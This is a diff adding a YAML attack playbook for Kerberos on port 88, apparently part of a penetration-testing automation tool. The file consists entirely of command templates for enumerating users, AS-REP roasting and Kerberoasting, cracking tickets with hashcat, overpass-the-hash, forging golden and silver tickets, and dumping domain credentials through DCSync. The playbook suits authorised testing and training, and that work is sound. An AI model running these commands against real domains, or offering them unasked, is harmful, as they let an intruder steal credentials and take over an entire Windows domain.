@@ -1,0 +1,46 @@
+service: kerberos
+ports: [88]
+categories:
+  enumeration:
+    - id: kerb_userenum
+      description: "Enumerate valid usernames via Kerberos"
+      command: "kerbrute userenum -d {DOMAIN} --dc {IP} users.txt"
+      priority: high
+    - id: kerb_preauth
+      description: "Find AS-REP roastable users (no preauth)"
+      command: "impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -dc-ip {IP} -no-pass"
+      priority: high
+  exploitation:
+    - id: kerb_asrep
+      description: "AS-REP Roast (crack offline)"
+      command: "impacket-GetNPUsers {DOMAIN}/{USER} -dc-ip {IP} -no-pass -format hashcat"
+      priority: high
+    - id: kerb_kerberoast
+      description: "Kerberoast service accounts"
+      command: "impacket-GetUserSPNs {DOMAIN}/{USER}:{PASS} -dc-ip {IP} -request"
+      priority: high
+    - id: kerb_crack_tgs
+      description: "Crack TGS tickets"
+      command: "hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt"
+      priority: high
+    - id: kerb_crack_asrep
+      description: "Crack AS-REP hashes"
+      command: "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt"
+      priority: high
+    - id: kerb_overpass
+      description: "Overpass-the-hash (get TGT from NTLM)"
+      command: "impacket-getTGT {DOMAIN}/{USER} -hashes :{HASH} -dc-ip {IP}"
+      priority: medium
+    - id: kerb_golden
+      description: "Golden ticket (requires krbtgt hash)"
+      command: "impacket-ticketer -nthash {HASH} -domain-sid S-1-5-21-... -domain {DOMAIN} Administrator"
+      priority: high
+    - id: kerb_silver
+      description: "Silver ticket (requires service hash)"
+      command: "impacket-ticketer -nthash {HASH} -domain-sid S-1-5-21-... -domain {DOMAIN} -spn CIFS/{IP} fakeuser"
+      priority: medium
+  post_exploitation:
+    - id: kerb_dcsync
+      description: "DCSync (requires replication rights)"
+      command: "impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{IP} -just-dc"
+      priority: high
